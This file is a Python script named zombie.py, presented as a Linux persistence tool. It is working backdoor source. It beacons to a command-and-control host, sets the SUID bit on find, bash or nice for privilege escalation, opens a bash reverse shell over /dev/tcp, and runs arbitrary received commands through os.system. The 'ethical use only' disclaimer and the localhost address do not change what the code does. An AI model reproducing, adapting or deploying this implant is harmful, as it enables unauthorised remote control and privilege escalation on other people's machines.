#!/bin/python3

"""
Program: zombie.py
Purpose: The purpose of this script is to develop a program that takes over a user on a linux-based machine (persistence)
Developer: CyberPanther232
Date-Created: 16-May-2025

DISCLAIMER: FOR ETHICAL AND LEGAL USE ONLY
"""

import os
import socket
import time
import random

NECRO_HOST = "127.0.0.1"
NECRO_PORT = 9000
VECTORS = ["find","bash","nice"]

def locate_vectors():
    binary_locations = {}

    path_dirs = os.environ['PATH'].split(os.pathsep)

    for binary in VECTORS:
        found = False
        for directory in path_dirs:
            full_path = os.path.join(directory, binary)
            if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
                binary_locations[binary] = full_path
                found = True
                break
        if not found:
            binary_locations[binary] = None
    
    return binary_locations

def infect():
    try:
        vector_locations = locate_vectors()
        vector_selection = random.choice(VECTORS)
        os.system(f"chmod u+s {vector_locations[vector_selection]}")
        # print(vector_locations[vector_selection])
    except Exception as e:
        print(e)

def cure():
    try:
        vector_locations = locate_vectors()
        vector_selection = random.choice(VECTORS)
        for k, v in vector_locations.items():
            os.system(f"chmod u-s {v}")

        # os.system("rm os.path.basename(__file__)")
    except Exception as e:
        print(e)

def shell(port):
    os.system(f'bash -c "$(/bin/bash -i >& /dev/tcp/{NECRO_HOST}/{port} 0>&1)" &')

def carrier():
    pass

def callback(socket):
    try:
        socket.send("brains...".encode())

        data, conn = socket.recvfrom(1024)

        data = data.decode()

        if data:
            return data
        
        else:
            return False
    except Exception as e:
        print(f"ERROR: {e}")

def main():
     while True:
        try:
            time.sleep(random.randint(0, 30))

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            sock = s.connect((NECRO_HOST, NECRO_PORT))

            received = callback(s)

            if received:

                if not received.strip():
                    continue  # Skip empty input

                # Split command and arguments safely
                parts = received.strip().split(' ', 1)
                command = parts[0].lower()
                arg = parts[1] if len(parts) > 1 else ''

                print(command)

                if command == "kill":
                    exit()

                elif command == "shell":
                    if arg and arg != 9001 and arg >= 1024 and arg < 65536:
                        shell(arg)
                    else:
                        shell(9001)

                elif command == "infect":
                    infect()

                elif command == "cure":
                    cure()
                
                else:
                    os.system(command + ' ' + arg)

            s.close()
        except Exception as e:
            pass

if __name__ == "__main__":
    main()